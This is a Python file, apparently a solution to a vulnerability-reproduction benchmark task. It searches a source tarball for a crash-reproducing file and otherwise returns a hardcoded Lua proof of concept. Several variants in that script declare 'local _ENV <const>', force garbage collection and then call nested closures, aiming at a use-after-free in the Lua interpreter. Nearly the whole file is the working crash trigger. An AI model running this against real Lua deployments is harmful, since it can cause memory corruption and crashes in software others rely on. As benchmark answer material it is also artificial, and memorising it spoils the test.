import tarfile
import io
import re
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = self._extract_poc_from_tar(src_path)
        if poc is not None:
            return poc
        return self._fallback_poc()

    def _extract_poc_from_tar(self, src_path: str) -> Optional[bytes]:
        try:
            tf = tarfile.open(src_path, mode="r:*")
        except Exception:
            return None

        target_len = 1181
        best = None
        candidates = []

        def score_candidate(name: str, text: str, size: int) -> int:
            s = 0
            lname = name.lower()
            ltext = text.lower()
            if name.endswith(".lua"):
                s += 3
            if "<const>" in text:
                s += 7
            if "_env" in ltext:
                s += 7
            if "local _env" in ltext:
                s += 5
            if "collectgarbage" in ltext:
                s += 2
            if "function" in ltext:
                s += 1
            if any(k in lname for k in ("poc", "crash", "trigger", "repro", "uaf", "use-after", "heap", "env")):
                s += 6
            # closeness to target length (soft preference)
            s += max(0, 5 - (abs(size - target_len) // 80))
            # explicit phrase boosts
            if "_env <const>" in ltext or "local _env <const>" in ltext:
                s += 8
            return s

        for m in tf.getmembers():
            if not m.isreg():
                continue
            if m.size <= 0 or m.size > 200000:
                continue
            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read()
            except Exception:
                continue
            try:
                text = data.decode("utf-8", "ignore")
            except Exception:
                continue

            s = score_candidate(m.name, text, len(data))
            if s > 0:
                candidates.append((s, -abs(len(data) - target_len), -len(m.name), m.name, data))

        if candidates:
            candidates.sort(reverse=True)
            best = candidates[0][4]
        return best

    def _fallback_poc(self) -> bytes:
        # Multiple variants attempting to exercise the incorrect code generation
        # when local _ENV is declared as <const>. We try to ensure the local _ENV
        # table becomes unreachable before the nested closure runs, encouraging UAF.
        lua = r'''
-- Variant 1: simple nested closure using assignment to a global (should index local _ENV)
local function make1()
  local _ENV <const> = setmetatable({}, { __index = _G })
  local pad = {}
  for i=1,200 do pad[i] = {i, tostring(i)} end
  return function()
    for i=1,10 do a = i end
    return a
  end
end

-- Variant 2: read from a global in nested closure
local function make2()
  local _ENV <const> = setmetatable({}, { __index = _G })
  local big = {}
  for i=1,500 do big[i] = string.rep("x", i % 40) end
  return function()
    return x, print
  end
end

-- Variant 3: nested closure deeper
local function make3()
  local _ENV <const> = setmetatable({}, { __index = _G })
  local t = {}; for i=1,300 do t[i]=i*i end
  local function inner()
    for i=1,3 do y = i end
    return y
  end
  return inner
end

-- Variant 4: uses both read and write to "global" names
local function make4()
  local _ENV <const> = setmetatable({}, { __index = _G })
  local s = {}
  for i=1,256 do s[i] = string.char((i%26)+97) end
  return function()
    z = table.concat(s)
    return z and #z or 0
  end
end

-- Helper to stress allocations and encourage freeing of the local _ENV tables
local function stress()
  local junk = {}
  for i=1,4000 do
    junk[i] = {i, tostring(i), {i*2}}
  end
  junk = nil
end

local function run_variant(maker)
  local f = maker()
  collectgarbage("collect")
  collectgarbage("collect")
  stress()
  -- Execute the closure; if the compiler failed to capture _ENV correctly due to <const>,
  -- this may dereference a collected table.
  return f()
end

-- Run all variants
run_variant(make1)
run_variant(make2)
run_variant(make3)
run_variant(make4)

-- Additional patterns mixing blocks and scopes
do
  local function outer()
    do
      local _ENV <const> = setmetatable({}, { __index = _G })
      local function inner()
        q = 42
        return q
      end
      return inner
    end
  end
  local f = outer()
  collectgarbage("collect"); collectgarbage("collect")
  stress()
  f()
end

do
  local function outer2()
    local _ENV <const> = setmetatable({}, { __index = _G })
    local tmp = {}
    for i=1,128 do tmp[i] = i end
    return function()
      r = (r or 0) + 1
      return r
    end
  end
  local f2 = outer2()
  collectgarbage("collect"); collectgarbage("collect")
  stress()
  f2()
end
'''
        return lua.encode("utf-8")